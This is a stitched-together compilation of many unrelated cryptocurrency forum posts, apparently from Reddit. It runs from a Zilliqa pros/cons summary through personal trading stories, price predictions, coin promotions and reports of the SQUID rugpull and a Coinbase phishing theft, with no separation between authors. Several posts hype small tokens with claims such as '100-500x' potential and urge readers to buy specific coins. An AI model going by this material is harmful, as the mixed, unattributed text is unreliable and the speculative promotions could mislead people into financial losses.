Overall, Zilliqa is a secure platform, however keep in mind that it is still in development. This means that it can't accomplish some things safely just now. To prevent the platform from being exploited, improvements must be done.

# TLDR; The Pros and Cons

### Pros:

1.  **It has cutting-edge technology:** Zilliqa is the first platform to employ sharding. This puts it ahead of the competition. It is a completely new type of blockchain meant to address the issue of scalability. Third-generation platforms, such as Zilliqa, may be the main winners in the cryptocurrency future.
    
2.  **It has a large fan base:** The platform has a large fan base. The Zilliqa ICO only took place because there was such a high demand for it. The Zilliqa ICO also demonstrates that the crypto community is ready for blockchain technology to advance to the next stage of development.
    

### Cons:

1.  **Team might not be that experience**: Zilliqa's creators are academics, not businessmen. Zilliqa's technology is ahead of the competition, but its business isn't. Other platforms, such as OmiseGo, have far greater ties to real-world enterprises. Zilliqa has a lot of work to do if it wants to be one of the top cryptocurrencies.

I've been in the market since 2016 trying to do well. Hasn't gone well until 1,5 yers ago I started to really get some gains after ditching all the shitty tokens and sticking to the right ones.

But now I feel like I'm missing out on all the great projects that are starting to go wild. Most of them are already on prices that I'm not comfortable to buy anymore because the hype is getting them up and with my luck as soon as I get in, the candles turn red.

Talks about this being the last super run we will get is making me even more anxious.

It's really hard on sticking to my plan of not putting in anymore fiat in this bullrun but at the same time I've got many of the assets being held "hostage" in a way that theres a lot of money on those tokens, but they're all still very much in the lower prices than this dumb head of mine bought them at. Therefore I don't want to sell them until I'm at least even but I'm afraid that they will never get there before the bear market sets in.

I've been collecting anime figurines for the last 15 years, and avid collectors know that the prices of these things have only ever increased over the years. Especially the 1/7 or 1/8 scale figures which I particularly fancy. Even with my job's discount (I work for a Japanese hobby company), this stuff adds up quick, and over the next year I've got 5 new figures on preorder, the most I've ever had preordered at once. Normally I'd be squirreling money from my paycheck away each month, but I don't need to do that anymore thanks to the power of crypto.

With my crypto card, my monthly expenses that I migrated over to the card MORE than pays for these preorders with a nifty 4% back reward program. Within a couple months my figure fund will be completely full and I will still have left overs to re-invest after. That money that would have been out of my paycheck is now freed up for other things, giving me more flexibility which is a wonderful feeling. I'm not the most adventurous investor, I DCA what I can into my bags and I HODL, so the fact that my expensive hobby is being taken care of with such minimal effort is amazing to me. I can't wait to see how crypto grows and gives others more financial power and freedom.

Just to clear a couple of things up. I don't want to denounce any body choice how to invest his/her money. I too purchased 100,000s DogeCoins &amp; I've been holding since then.

DogeCoin hasn't recovered from it's all time high &amp; fall from grace on May to date even with the major players either bounced back or reached new high.

Yet, DogeCoin remains at it's loss of almost more than 50% of it's May value.

I have purchased a hefty amount of LRC because of the concept that they are interducing with GameStop thanks for a great insight from a follow redditor yesterday from a great detailed post.

My investment value in LRC doubled in a day &amp; from it's current position &amp; potential is excellent.

Hi,

Thank you very much in advance if you can spare a few seconds to help out.

I've been testing with smaller amounts with the aim of minimising fees.

I use CoinMetro to fiat GBP as they only charge 1 for that and their maker fee is 0% to get it on to Ripples XRP where I withdraw it to Kucoin for 0.1% taker fee and minimal gas. I then use Kucoin for XRP to USDT followed by USDT to AVAX.

I'm really just hoping for any general tips, gotchas, cost savings, etc. for this process (or any other subreddits that may also be able to help.)

Massive thanks in advance for any wisdom.

Warmest regards.

*Warning: I'd really enjoy some thoughtful pushback on what you're about to read. And please, do not read this if you cannot handle Ethereum criticism or counter arguments, because this is a very tough read. I'm a DeFi power user, have held ETH for years, and still do.*

The EVM is becoming a rollup-centric network, and after *the Merge*, the following update will bring sharding, which is more or less designed to speed rollups. Zk-rollups are the king of rollups, and unique animals, as they can operate independently, and their greatest trick is (or will be) composability across all L1's (Solana, Avalanche, Ethereum, Polkadot, etcetera) and from this, will likely settle transactions on the L1 that offers the most security at the time. Right now that's Ethereum of course because it has the most nodes, network effect, and with sharding will have the most data availability.

But even that scale alone (which determines security) will not be enough to generate the income required to sustain ETH's high value in dollar terms. Because as everything keeps moving off L1 becoming a Zk sidechain or independent interoperable Zk blockchain, how the hell is ETH going to be deflationary? It won't be. I mean Opensea alone is responsible for over 30% of all burned ETH since EIP-1559. And if ETH doesn't maintain its valuation, why would anyone commit to staking? Well presumably because the APY or "staking rewards" would increase. High enough? I'm not sure. But if people don't stake in great enough numbers and see a slow drip in ETH's price, or sense a slump in prestige, the security will degrade rapidly, making other L1's more attractive for settlement. 

You might think I'm hating on just ETH, but this goes for all L1 native tokens besides BTC. Nobody knows what's going to happen, but I don't see a 10x in any L1 token's future, especially when Zk's start getting advanced. I see a bright future for specific projects doing specific tasks which compose together, like how Tulio, Google Maps, and Stripe compose together to form the company Uber. So maybe decentralized entities like oracles, synthetic assets, decentralized insurance, gaming, algorithmic stablecoins, etcetera, shine. 

In other words, the new colonies (side chains, Dapps, etc), even if sprung out of Ethereum-loyal investments, will see Zk independence that searches for the most secure settlement at the lowest priceand that's *IF* these Zk's even require such a thing in the future, which is to say nothing of DAO's breaking cover either 

So that's why I plan on selling my ETH. I've realized that **MONEY** has nothing to do with TPS, throughput, or tx cost. Those are all features of a blockchain. BTC is the only **money**, which secures rights to property by leveraging energy. And energy is the only currency (this is different than money) in our world as it's required for a nation state to exist, a military to stand, a business to operate, transportation, farming, communication, etc. It's equally important to the metaverse and digital worlds. In this way, BTC should be man's final money, just as A.I. will be man's final invention, at least until we reach a type II civilization on the Kardashev Scale. 

It seems Henry Ford and Thomas Edison crudely realized all this back in 1921. Newspaper clip:

https://twitter.com/mallardshead/status/1454781760911421440?s=21

Governance has always been an issue for post-merge Ethereum that nobody's ever wanted to talk about, opting to quickly pivot the conversation towards the two other parts of the blockchain trilemma. And since ETH is the best of the alts, you can imagine how abysmal governance is for every other alt coin. 

The switch to Proof of Stake, or *the Merge*, which is essentially a miner kill switch, also killed Ethereum's ability to ever be money outside it's own sandbox. It's not tethered to the physical world (like how BTC leverages physical infrastructure) and its digital spawn will distribute away its power. We see no proof whatsoever of Fat Protocol Thesis. 

https://link.medium.com/zm6Nkg21Qkb

All we see is illiterate speculation. We see Dapps, sidechains, and L2 solutions becoming more technologically independent from Layer 1. Sure growing projects like Polygon pay plenty of lip service to ETH's "amazing attributes", but take a look at how Polygon's version of EIP-1559 works:

https://forum.matic.network/t/eip-1559-on-polygon/1230

For a decentralized blockchain with global aspirations, you don't ever want governance via democracy. Firstly there's no telling how many tokens are owned by how many people which impairs voting power and makes it unfair. Another problem is there's no way to curtail collusion. Another is that 50% of the world's population lives in two countries (China, India), and that percentage is only growing. Another is that voting is a skill, and this is important because there's no way a project's voters will vote for anything that doesn't benefit their investmentand likely in the short term too. Then, after something is voted on and passed, token holders against the change(s) have no recourse, which means they have no ability to opt-out. We won't even bother going into tokenomics. But understand this sh*t just doesn't work at all, it's not a solution to the current system because it's worse. 

Bitcoin does away with this nonsense by guaranteeing immutable rights, having fixed issuance, and tethering itself to the physical world by leveraging physical infrastructure, none more important than energy. Wether you have 1000 Bitcoin or 100 Satoshis doesn't matter. There's nothing the former can do that the latter cannot. There's no voting, no need to pay attention, no securing the network with staking, no special privileges, no collusion. And on the consensus layer, if a proposal is agreed upon by 51% of the hash, it's optional wether a miner wants to implement it or not, meaning they can opt-out.

Bitcoin's first attraction is greed, but below, it quietly disburses freedom and distributes away the center of power structures. Bitcoin pollutes the environment with carbon from an economy of scale (cheap electricity, access to capital), but below, it quietly incentivizes green energy, making it competitive regardless of fossil fuel affordability. The end result of this Trojan Horse is going to be fascinating to watch, and how fast it degrades nation states or finances sci-fi alternative energy projects might be its crowning achievementnuclear fusion anyone?

The Lightning Network is the most simple and elegant solution to scaling in the crypto-asset space. It's nowhere near commercial readiness, but I expect it will be before next halving. The Taproot upgrade comes in a few weeks which will enable DeFi, and there are world class teams (and Fortune 500 companies) working on those Dapps. The ultimate blockchain would be the EVM where you had BTC as a native token instead of ETH. But back in reality, if you want a glimpse into how blockchains, Zk's, Dapps, DAO's, or whatever we'll call them in the future will all ultimately decentralize themselves in unique ways via BTC, here's a tweet with Luna's founder:

https://twitter.com/terrabitespod/status/1454158643079811076?s=21

With all this said, I believe ETH will make a move to $9k-$12k in the next few months, which in percentage gain terms, will outdo BTC. My sell target is somewhere there. I'll swap most of it into BTC permanently, collect 6% APY yield on it, and use the remaining funds operating smartly between synthetic asset protocols (Mirror, Synthetix) and stock brokerages with the goal of delta neutral strategies that make money to acquire more Bitcoin. 

I didn't take an orange pill, but I think what turned me off ETH's path was a conversation I had with a Palestinian friend about how rapidly BTC is growing in Palestine, to circumvent the brutal capital controls of the Israeli's and the corruption of the Palestinian National Authority. And when I combined that with El Salvador's BTC remittance benefits (30% of their GDP are remittances), Ukraine's plan to use excess nuclear power plant energy to mine and invest in green energy thereby breaking reliance on Russian lng imports, or South Africans buying it as a source of retirement income, or the Turkish government realizing it's exacerbating their wild inflation, well, I've seen enough to tell which is money. 

Thank you for reading.

For me this extreme rise fo memecoins like doge and shib and elon show that the overall cryptomarket is very Solid.

Lot of people read exactly the opposide out of it, sayign that it puts a bad picture on the market, that the whole market is shit when you make more money with memes then with solid projects,...

&amp;#x200B;

Me myself, I view it a bit different. Those coins proof that there is ALOT of money ready ready to pump coins, alot of money ready to follow a hype, and alot of people who just want to earn a quick buck ready to invest in whatever they belive will make them money.

&amp;#x200B;

If our solid projects, or the whole market, would be jsut some hype driven buble, then this memecoisn woudl not exist, then all the money that is ready to invest into a bubble woudl just flow into all the other projects. 

But overall we are a solid market and to boring for hype, which means the money that is puted into the real projects is puted there cause of real belive and will also not so easily be taken out again

By doing nothing at all!!!

I'm not telling my wife, my best friend, my family or anyone except for the 3.7mill trustworthy users on this reputable sub ;)

I've been around this sub for a loooooong time (5 months lol) so I've learned a few things from others mistakes. Before I forget I did say this was a small personal goal I've reached, I am what most would say is a small fish in a big pond. It's just nice to see crypto help the little guy out when the big institutions are designed to offer debt with high interest rates to their customers...

Anyway as much as I want to be fist pumping my way down the street and chest bumping everyone who looks at me, I will stay composed and settle for a solitary "noice" to my reflection in the mirror .

Anyway I want to thank everyone who has spilled their advice and crypto story on this sub it has prepared me better for the crypto-verse. I have put my head down, stayed relatively quiet, DCA'd into projects that I've DYOR on (after hearing them be skilled on here haha) and slowly and steadily my debt is shrinking and my savings is growing. Such a great change of pace, it's put me in a great mood.

Ok rant over, I hope everyone is equally happy this morning, and as one Ethtrader celebrity always likes to say.

GLTA!!!!!!!!!!!!

OH PS. Even if I had made a stupid announcement stating a certain amount of gains, My DMs have been turned off since I started reddit haha. Everyone should try it, it's peaceful.

Hi all, Im fairly new to cryptocurrency trading around 6 months under my belt so far.
Has anyone got any advice for a newbie? I have around 1k invested in a couple of coins but I dont know if it is the right coins to invest in etc
I understand the fundamentals of cryptocurrency,
but I do know that the cryptocurrency world is a big one Im not a serious trader I have spare cash to invest for my future but dont want to make any stupid mistakes that most people do when they start trading,

Ive done extensive research into LSS but no one seems to be talking about it, theyre project is great I mean being able to retrieve lost btcs or coins thats just amazing and I think its necessary as there are plenty of hackers, scammers, and so on, what do you guys think about LSS and do you guys think it has potential?

This is top stuff by Bukele once again!  They will be building for a start 20 modern and fully equipped schools financed by proceeds that were earned through investing in Bitcoin!   


Great initiative by Bukele and It makes me truly happy to see news like this! Which bank has helped someone build schools without asking for some sort of interest bacK??? News like this is great but I am curious to see how they will use the profits? will they sell or just pay the contractors BTC.  


But whatever my full respect to Bukele and other nations should follow this- buildings schools and hospitals in the same way!

Since Loopring is pumping, the spam about it on this sub is ofcourse unavoidable since everyone here is always chasing the market.

For some reason, everyone is quoting Loopring having no gas fees as a super bullish case for them. However, I've been in this sub for 5 years and I've seen people bashing Nano, IOTA and other feeless coins exactly for that reason a thousand times.

If all three have no fee's, why is everyone here always doubting Nano and IOTA's security but Loopring seems to get the benefit of the doubt?

Only answers from people who understand how blockchains work, I am curious why a layer-2 solution on ETH is safe without fee's while IOTA's Tangle and Nano's DAG aren't

Ok, so ever since Ive opened up a Binance account, it was set up with 2FA

First, the most insecure SMS-based one which Ive promptly switched to Google Authenticator.

After Ive gotten myself a pair of Yubikeys, Ive disabled GA and switched to U2F/Yubikeys - after which Binance kept nagging me about enabling 2FA, whereas in other places in their they kept showing me that 2FA was enabled - talk about confusing UI (of course, the Yubikeys have been enabled and mandatory for signing in)

Now, fast forward to today, I wanted to withdraw a small amount of crypto which I got from CMC Earn and it wouldnt let me, unless I enable GA-backed 2FA, which I again did

I wonder, has anyone else encountered this confusion? I dont want to have another 2FA solution on my account, possibly allowing to bypass the probably more secure U2F solution already in place?!

Thanks in advance!

I wish I had 6 figures which I could throw on Shitcoins

I hear stories about people investing hundreds of thousands on Shitcoins, and honestly Im jealous on how much money they have. Also, it gives me hope that if they can be so dumb and still be rich, maybe I can achieve it too! 

If you have $10 million+ would you spend $100k on Shitcoins? Thats like me spending a couple thousands lol, so I guess its not too dumb. 

Have any of you bought a significant amount of a shitcoin? I have bought them before but never more than a $100.

BTC, ETH, ALGO, MOONS, shitcoins...sure we see lots of stuff on them here but I'm sure that there are loads of others that also need some love and attention. At the same time it's clear that at the moment there are so many different coins and tokens that it's getting harder to keep up (who has time for all of this?) 

I'm interested to hear from you guys which crypto projects in your view need to be noticed more and why? In my view, some contenders are ICP, AVAX and GRT (if you disagree that's fine just explain why).

So as the title says my gains made me have an accident on my way home from work yesterday \*story time\*

A few days ago I moved about \~20% of my portfolio into Loopring when the first rumours hit this sub when the price was back at something like 40p (that's right it's a UK story guys) then I moved another 30% of my portfolio into it when the price went up to about \~50p, just hours before the price started pumping. I was just so few up of putting tiny 5% amounts into coins that were getting popular then taking the tiny gains. I wanted to be one of those people this sub bitterly hates for hitting the big time.

So I was taking the train cross our little English countryside watching the price pump up and up, so sure that I finally hooked a sub B marketcap coin that was a "sure thing" to hit the double B values for once.

After the train I got in my car and my mind was a wash with thoughts of gains, I could barely focus on the road. Thinking about how my life will change and what I could spend that money on. I was in dreamland. And then it happened. A second of judgement lapsed and it happened.

I passed by the car dealership region in my tiny little eco nothing brand and my eye caught the shiny Porsche dealership and I mumbled to myself "I'm gonna get one of you soon".

And it was at that moment, that meaningless one night without thinking, that I had broken this subs number 1 rule...'when lambo' I muttered to myself but it was too late, I tossed away years of dedication and commitment for a passing fling in the heat of the moment.

Forgive me but don't forget me, for I have sinned and deserve your pity and your punishment.

If you believe in crypto and youre invested in the long-term, why would you sell at all when, for example, ETH hits a new ATH?

I could sell 1 ETH now for a really nice chunk of change, but to what end? Convert it back into fiat and put it in the bank? Convert to a stablecoin and gamble on timing the dips perfectly?

Im genuinely interested in what you guys do with the money when you take profits, and why you choose not to hold in an appreciating asset class.

I know everyone has different priorities and financial goals, obviously, but personally, Id rather hold the 1 ETH long-term. Time in the market always beats timing the market.

Hey guys,

So recently I have decided to do some research into some degenerate micro caps and came across Hapi and Maple. Both seem to have extremely good ideas that they are built on and both seem to have utility (With Maple reaching up to 264 million dollars of liquidity provided to institutions). I have been scouring trying to find some negatives about the projects but I just can't seem to fault them. I was wondering if anyone has also done some research and found something that I couldn't as to why they are both so small still. New to all of this so any help is greatly appreciated.

There is no place for emotions in crypto.

I have couple of projects in my portfolio that I am passionate about, but guess what, money is money and money does not have emotions. 

Emotions are in human nature, we can't control them but we can learn how to limit them.

&amp;#x200B;

1. Make a plan, a strategy and follow it. Everything starts with a good plan. Mine is DCA in, and DCA out, and I have a lot of patience with holding coins and staking them.
2. Always DYOR
3. **Don't obsess over market charts. Watching them all the time will just burn you, and it can destroy your social life**
4. **Know your limits**

 Buying and trading cryptocurrency can be exciting and potentially profitable. However it also comes with risk and high emotions. We all need to learn how to limit them.
-------------------------------

So I read a lot comments from those hoping to make it rich on crypto so they can quit their stupid jobs and pursue their dream lifestyle. That's fine. I can empathize with that.

However, as a thought experiment, imagine if the entire world, absolutely every single person on this planet, got rich on crypto and quit their jobs.

Nobody would be working anymore. There would be no more businesses, nothing produced, nothing to spend your money on. No more innovation, no more fancy gadgets, no more flights, no more holidays, no nothing.

Everyone just has to stay at home with their millions because there's nothing to do with everything closed down. Is that your dream?

Some Snippets from SQUID rugpull

 

## I Lost Everything

SQUIDs inflexible tokenomics has caused many investors to lose a lot of money.

Describing Mondays brutal crash, one SQUID holder told CoinMarketCap:

**The price was multiplying at an abnormal level. And as I was staring at my computer screen, I watched SQUID fall down in a matter of minutes. There was no way to withdraw my funds intact.**

They said they were drawn in by news outlets that gave attention to SQUID  and that this additional marketing made them feel that the project was genuine:

**I guess this will serve as a valuable lesson for me to not just jump into meme coins  I am not blaming anyone except myself, but I think there must be some mechanism to avoid this in the future, and for news outlets to stop giving attention to these scammer type tokens.**

Others describe how their **$57**investment surged to **$14,000**  and their frustration at being unable to sell their token.Another victim told CoinMarketCap I lost all of what I have in this project. He had bought**5,000 SQUID**at **$1** apiece.

I dont trust in them anymore, he added.

Crypto investors are regularly encouraged to scrutinize a projects website to see whether information about the founders is prominently displayed.

Squid Games website did this  naming David Kanny as CEO. He was described as a University of California Irvine alum who had five years experience at Netflix, but no LinkedIn profile exists.

Searches for other named executives  Mabel Jah, Kevin Sam, Christian Abbigail, Daniel Jolia and Lawrence Dan  also drew blanks on Google.

In the Netflix show, Squid Game depicts characters who are willing to put their lives on the line for a better financial future.

But for those who put their money on the line by investing in SQUID, any hope of a better financial future has now been lost in the blink of an eye.

I just thought anyone would be interested to look into this project .. they have kawa farm where u can stake shib .. they are working on an algorithm to increase rewards which should be better than binance shib staking or SS. The farm has passed security audit last week .. great team with great leadership imo .. team have gone thru kyc .. check their lite paper and website .. low market cap now only 15 m .. if floki has 2.5 billion market cap then kawa imo with solid fundamentals and real use case has huge potential maybe 100-500x .. cs is 1 trillion .. 

Do ur research .. 
general advice in cryptos is to put money u are ready to lose ..

Imo every shib holder should have kawa in his/her portfolio.. I own shib, saitama and kawa .. I swapped half of my saitama to kawa .

This is a counterpost to a trending one on the Hot page : [https://np.reddit.com/r/CryptoCurrency/comments/qkxa0n/youre\_in\_your\_20s\_thinking\_about\_buying\_a\_new\_car/](https://www.reddit.com/r/CryptoCurrency/comments/qkxa0n/youre_in_your_20s_thinking_about_buying_a_new_car/)  


No dude, you are wrong.  
Im from eastern europe. 8 years ago me and a buddy of mine went to Germany on a student program working summer jobs. At that time I was 20. 

Fast forward, 3 months later we came back with some money. He invested in crypto and some stocks, I bought myself a really nice Audi.  
I had it for 2 years and man did I have some fun on the backseat of that Audi, if you know what I mean. It exposed me to the car world, I went on car meets and met many people I stayed friends with.  
I had a hobby I really enjoyed - tinkering with my car, tinkering on my new buddies cars.

That Audi (sounds lame, I know) gave me the selfesteem and confidence to be able to approach a certain girl who I know call wifey. Not that she cared what I was driving, she still doesn't, but in my mind back than I felt like Zeus!

I had something nice in my young years and I have zero regrets!  


My buddy who invested in crypto? Managed to lose half of it in trading, rest he hodl-ed for some years and than cashed out when he got 3x on his money. Back than nobody had the conviction in BTC we have today, keep that in mind. Last time I saw him he also had a nice car. What he also had was missed opportunities in his 20's from living under his financial standart.

All of this we are doing here is to have a better life. Whats the point of you having a multimillion dollar portfolio and ride around in an old Civic?

I don't have any regrets buyin a cool car in my 20s, not sure about my buddy.

I know there are a few but generally just the largest, safest and most simple. I want to buy the coins at ICODROPS.COM early basically, steering away from any meme coins but actual utility ones. I have pulled up a list but they all seem to look and act like exchanges, I would prefer a dedicated platform if possible. 

Also while I am at it, where did projects like SOLANA , ETH, MATIC etc all release and debut ? Is there a platform that these coins sit at?

For the 500 min characters; I recently have got into MINA.. its worth a look into, bitsize blockchain.

So for context, I basically just received my cb card, and I'm looking to maximize that juicy 4%. I couldn't find the answer in previous threads I've skimmed though, and the answers I did find were from several months ago, so I'm hoping what im trying to do has been resolved. Basically, my wife writes the check for our mortgage (I don't have a check book), however I actually pay the mortgage. I pay her through Venmo. The previous threads I read, people mentioned venmo not supporting the coinbase card yet. Does anyone have any recent experience with this? I'd love to hear any input on what others may be doing to maximize their 4%?

Well well well, if it isn't our good boy Mr.Polkadot making its move with a new market cap of $52 billion as it flips XRP.

I made a post about DOT hitting it's new ATH yesterday and how surprised I was that it was flying under the radar. Your responses has shown that it wasn't as ignored as I thought it was. As I mentioned before, maybe this is the time for DOT to shine with an explosive uptrend and behold, here we are less than 24 hours later. It also just hit a new all the time high of $53.25

Put your seatbelts on moonboys cause we are going on a trip in our crypto rocketship.

Everything decentralized is actually a good idea at first glance, but wherever there is no authority there is turmoil and chaos. The origin of Bitcoin was to end the authority of centralized currencies. That is, to eliminate exchanges that control and manipulate money.

Unfortunately, the number of people who use bitcoin on the stock market rather than using it for **p2p** purposes is considerably higher than those who use bitcoin for its real purpose. That's why bitcoin is no longer secure. **Anonymity is gone**

Everybody is all gungho about El Salvador adopting crypto and buying dips and blah blah blah.  But what do you think the people are going to do when bitcoin drops, like it has in the past, at the beginning of a bear market.  

&amp;#x200B;

These aren't drops of 10 percent.  Imagine the majority of people living paycheck to paycheck all of a sudden see their bank account drop by 80 %.  Has this aspect been discussed?  

&amp;#x200B;

I know we all want crypto to succeed but it seems people ignore some big things that still have to be fixed before mass adoption (gas fees with ETH, crazy volatility with all cryptos, fucking jumping through hoop rings to transfer from here to there and not fucking up where you are sending it to or on what blockchain, etc.)

So 5 days ago I experienced a mini woosh with Arcona, after the Facebook / Metaverse news etc. However, now I am currently the John Travolta gif from Pulp Fiction wondering which way to turn. What shall I take out, when, how much etc ???  All while my wife is reading about Squid Games in the media and saying "Take it all out now".   


I still believe in the project, I think the price will continue to go up - especially when it goes onto an exchange - But I have very little clue on which way to turn. Do I sleep with Mia Wallace and risk it all, or do I go home and end the adventure.   


What do you do when you haven't planned for something going well is effectively my question?

There is a poem that became famous last bull cycle and it fills me up with so much energy thought to share it with you all.

I am not the original author of the poem.

Their spirits were sunken and low
Their bags weighed more than a ton
There was neither sign nor show
When the bull began his run
The shills were shilling from wall to wall
The gig was up; they'd had their fun
And every short got a margin call,
When the bull began his run.

The candles green came fast and tall
Each wick was bold, quick to stun.
His eyes burned red, and his horns did maul
When the bull began his run.

Now the fortunes smiles upon the neet
His bags of gold gleam in the sun,
Doubters dream of his balance sheet,
And every bear is left with none,
Since the Bull began his run.

Etherum is currentyl trading at $4470.  I know that this was expected to happen sooner or later, but it also clarifies those new investors who are misled by the recent wave of shitcoins hitting the market. 


Why do I think that ETH2.0 will be a game-changer?

**Scalability**

Ethereum 2.0 upgrade will improve the network significantly. Ethereum 2.0 is expected to support 1000s of transactions per second, to make applications faster and cheaper to use, thus making the network more scalable.

**Sustainability**

Ethereum 2.0 is also planning to move from the current Proof of Work protocol to Proof of Stake. This upgrade will address one of the major concerns associated with energy-sensitive crypto mining and shift towards environment-friendly, greener technology.

**Gas Fees**

One of the major deterrents for any new investor to invest in Ethereum or make transactions on the ethereum network; is the high Gas fees. Sharding will increase the number of transactions on the network, addressing congestion issues and reducing the transaction fees.

My humble prediction for Etherum is $6000 by the end of November; what's yours?

I had $3000 worth of SDN which I bridged from the SDN mainnet to the ETH mainnet because I wanted to use ERC20 to send it to an exchange.

I realised I didn't need to do this anymore, so I used AnySwap ([https://anyswap.exchange/#/bridge](https://anyswap.exchange/#/bridge)) to bridge the SDN back from ETH mainnet to SDN mainnet. I clicked 'Swap' and it's been 1 hour and nothing has come through to my MetaMask wallet on the Shiden network.

I checked the transaction ID, and it said it was sent to a black hole? [https://etherscan.io/tx/0x486b514b2d855acb181e8b56f654aff7142718915a228d4fa03d8909aa542caa](https://etherscan.io/tx/0x486b514b2d855acb181e8b56f654aff7142718915a228d4fa03d8909aa542caa)

How can this happen? I'm so devasted that I feel sick to my stomach, and would really appreciate any help.

So i recently saw the new Illuvium "gameplay" trailer and I must say that I'm really disappointed. Is this the future of crypto gaming - Pretty autobattler. It looks great not gonna lie but there is no gameplay, it's literally a Pretty TFT clone.
If you want to just want to watch pretty graphics with the gameplay just play TFT, yeah you won't earn money, but you won't lose money too.
I hate this graphics over everything thing.
When will good crypto games come...
As of now the CRYPTO part is way too much being focused, there also needs to a damn game...

Now this is worth celebrating.  grats to all holders.

not a shitcoin, not a meme, but the real deal breaking ath's. price discovery here we come. 

I first started buying ETH when it was around 900 bucks so by no means was I very early. I've continued to DCA even though it was DCA'ing up, and haven't regretted it since. 

Where will the new resistance point be?

A Coinbase User bought 200 bitcoins, which is now worth about $12 million

A notification popped up on the users phone that said their account had been locked. The notification appeared as if it was from Coinbase , but it wasn't.(we saw this coming)

The notification was a scam . A few moments later  almost $11.6 million in crypto, about 206 bitcoin, was removed from the user's account.

Its unclear how the scammer knew about the Coinbase transaction .

He/she called a number associated with the notification. An unknown individual answered the call and changed the users account, allowing much of the money to be transferred out of their account.

Since everything is hot lately, let's not take for granted thar we have now cross the 2.8T market cap for the first time. This is a very bullish sign and I still believe the market has more than enough to get to 3T and beyond...

Meme coins are flashing, DOT ATH, BTC holding over 60k as support, Ethereum ATH... Everything is going nuts.

NFA: don't try to chase the pump. One thing I've heard is when the market is like this, best thing you can do is do nothing and just watch. This is actually the hardest part. 

What's your estimation for the Total Crypto Market cap for this cycle ?

Hello guys i came here to get hoppefully some good advice.
I am in ADA for a while now and want to take out a big chunk of my profit like 60% of what i have in ADA and want to invest in some other lower cap coins with a good future. The reason why i am taking that amount of profit out of ADA is that i want to be apart of more good project and ofcourse make some more money on the way as ADA is standing a bit still at the moment
                                                                                                             
So my question for you guys is do you have a coin with a future that you will think will rise. I want to do more research about them if they sound good can be lower cap, can be a bit higher cap give me some examples i need to look into i am very intrested in this crypto world and want to learn more about it and get some money.
                                                                                                       
Thank you everybody that gave a option or options much appriciated.

Noob here. Can someone please explain an optimum size of a market cap and fully diluted market cap in the context of smaller crypto currencies? I'm looking at Enjin and other "smaller" coins. In an ideal world, I'm looking to wrap my head around what a good fully diluted market cap size is in relation to a coin that has dipped or plateaued and is pumping higher. So an explanation in relation to a smaller crypto would be appreciated.

&amp;#x200B;

PSA: I haven't and won't buy until I wrap my head around everything. So before anyone dishes out advice that I need to go and learn more because IDK WTF I am talking about, kudos to you because that's why I am here asking.

Interesting chart from [InvestAnswers](https://www.youtube.com/watch?v=Wm0w-EGtqgM&amp;ab_channel=InvestAnswers) Video with R. Breedlove.

The chart glasbowls the value of Money Expension, Puchasing power and the respective value of inflationary money and a non inflationary alternative like Bitcoin.

Its interesting to me because i never considered the devaluation of property in wake of the Puchasing Power. While the Property rises in value, it is nowhere enough to outpace the value inflation as an investement. 

Just something to keep in mind and maybe adjust some of your thoughts on money, property and what is key to a good asset.

As the title saysdoes anyone hold any? Or has anyone looked into it and decided its not worthwhile or is a scam?
It seems to have an excellent webpage, and an active Facebook with the developers names and faces.
Market cap of 57 million.
Liquidity of 5 million.
Total supply of 4 Billion.
Has only been available for 2 weeks, so is very new.
They have a proper whitepaper and roadmap too.

Low burn address amount though

There seem to be a lot of copycat tokens, so the one I am talking about (the real one) is has a contract address of .. 0x6169b3b23e57dE79a6146A2170980cEb1F83b9e0

So has anyone checked it out? It seems like a shitload of design and development to put in if its a scam.

Im definitely not trying to shill or anything, and would be happy for someone to correct me if Ive brought up a shit token, but it seems good.

Definitely do your own research and dont jump into anything or invest money you cant afford to use/lose.

Things are going well for us my friends, nice growth and easy consolidation ahead. Its time to sit back and just wait, hold and enjoy :) your time will come, eventually all coins will have a big pump in this bull run, some will have 2 big pumps and others will disappear over night. 

The questions is how long will it last? What do you think, will there be a big crash or this will last until spring :) because it looks like we are more powerful then ever and Bitcoin will sone reach 100.000 dollars

Most of the people in the world nowadays are aware of the cryptocurrencies or at least have some idea that it's some kind of a "computer money". It's close to impossible not to hear about at least one of the cryptocurrencies nowadays on news and other media or simply by word of mouth.

But the fact is, that an **extremely small percentage** of those people even remotely understands what crypto truly is. It's not a simple currency like people think. It's so beyond being just a currency "replacement" or a way to mitigate the rising inflation.  Not even close. Neither is it 1 thing nor 2. 

**It's a whole new world of applications to real world problems and solutions that will change the world as we are seeing it.** 

This is comparable to early days of internet. First it was ARPANET which was only a way of communicating with a remote pc. Then revolutionary email..then basic websites..pictures..sound..video...games...real time streaming, sending massive amounts of data via cloud solutions and more. 

Same evolution is happening in crypto right now. First it was an idea of decentralization by visionaries, then it was Bitcoin, later smartcontracts realization, staking, DeFi platforms..and so on.  We cannot even comprehend right now, how this will change our lives and the technology that we are using and will be using. That's what people aren't aware about when it comes to cryptocurrencies. It's not some digital money to replace your creditcard so you can buy stuff online or to be your own bank. Thats like saying internet is only for sending text messages to a remote pc, while in reality its the base on what our society nowadays is built on.

The ETH ICO would grant you 2k ETH for 1 Bitcoin (although that was at the beginning, if i remember correctly the longer you waited to invest the less you got until the end of the ICO).   


That means ETH was selling for about $0.25 each -- today your $500 investment would have netted you almost $9,000,000.00.   


At the time, Bitcoin was coming down from it's $1200 high--something that was ruled an impossibility until it actually happened. Likewise there were a lot of folks who never thought that ETH could even reach $100 (let alone $4,400!!).   


As the entire crypto market cap gets bigger and bigger, it's entirely possible that coins that are currently trading for $0.25 will also be selling for over $1k each.   


So what would you place your bets on? Which coin would you buy 2k of today in hopes of a 7 figure return in five/ten years?

When I go to Coinmarketcap or other crypto lists something confuses me. For instance, It says that Elrond has a contract on the Binance Smart Chain, and that Cosmos has one on Ethereum. Both of these I understand to be their own blockchains, so what does it mean that they have contracts on other chains?

It seems to be this way with a lot of other blockchains and some of the apps developed for a certain chain, e.g. Raydium on Solana. Some apps have contracts on almost every chain, other apps or chains have no contracts listed.

I assume some of this is just Coinmarket not updating regularly. But what is up with the multiple contract thing?

So I've been using the Socios app for a while now to collect fan tokens for various teams/sports. Just a bit of fun more than anything.

I'm now looking to sell all my tokens and cash out the chiliz on this latest pump, I'm heavily in green.

Yet now I can't even sell a fan token through their app. It tells me I must be using the token within a poll and it will become available once the poll ends. Sadly I've not used a single poll at any point either because of the buggy app not allowing me to enter them.

I try to send the tokens elsewhere and I can't because they want balls deep KYC which I'm not keen on.

So after praising what Socios have been doing recently I'm now concluding it's a piece of shit platform that needs a lot of investment to make it worthwhile for the users.

